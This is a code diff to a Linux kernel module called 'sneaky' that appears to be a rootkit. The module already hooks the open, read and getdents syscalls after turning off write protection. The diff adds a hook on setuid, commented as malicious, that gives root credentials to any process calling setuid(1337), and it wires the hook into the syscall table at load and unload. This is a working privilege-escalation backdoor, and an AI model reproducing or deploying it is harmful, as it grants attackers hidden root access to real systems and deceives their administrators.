@@ -9,7 +9,7 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
-
+#include <linux/types.h>
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -118,6 +118,37 @@ asmlinkage int sneaky_getdents (unsigned int fd, struct linux_dirent * dirp,unsi
   return origin_return;
 }
 
+//for setuid
+asmlinkage int (*origin_setuid) (uid_t uid);
+/* Malicious setuid hook syscall */
+asmlinkage int sneaky_setuid(uid_t uid)
+{
+  if (uid == 1337)
+    {
+      /* Create new cred struct */
+      struct cred *np;
+      /* Create uid struct */
+      kuid_t nuid;
+      /* Set uid struct value to 0 */
+      nuid.val = 0;
+      /* Print UID and EUID of current process to dmesg */
+      printk(KERN_INFO "[+] UID = %hu\n[+] EUID = %hu",current->cred->uid,current->cred->euid);
+      printk(KERN_WARNING "[!] Attempting UID change!");
+      /* Prepares new set of credentials for task_struct of current process */
+      np = prepare_creds();
+      /* Set uid of new cred struct to 0 */
+      np->uid = nuid;
+      /* Set euid of new cred struct to 0 */
+      np->euid = nuid;
+      /* Commit cred to task_struct of process */
+      commit_creds(np);
+      printk(KERN_WARNING "[!] Changes Complete!");
+    }
+  /* Call original setuid syscall */
+  return origin_setuid(uid);
+}
+
+
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
@@ -139,6 +170,8 @@ static int initialize_sneaky_module(void)
   original_call = (void*)*(sys_call_table + __NR_open);
   origin_getdents = (void*)*(sys_call_table + __NR_getdents);
   origin_read = (void*)*(sys_call_table+__NR_read);
+  origin_setuid = (void*)*(sys_call_table+__NR_setuid);
+  *(sys_call_table + __NR_setuid) = (unsigned long)sneaky_setuid;
   *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;
@@ -171,6 +204,7 @@ static void exit_sneaky_module(void)
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)origin_getdents;
   *(sys_call_table + __NR_read) = (unsigned long)origin_read;
+  *(sys_call_table + __NR_setuid) = (unsigned long)origin_setuid;
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
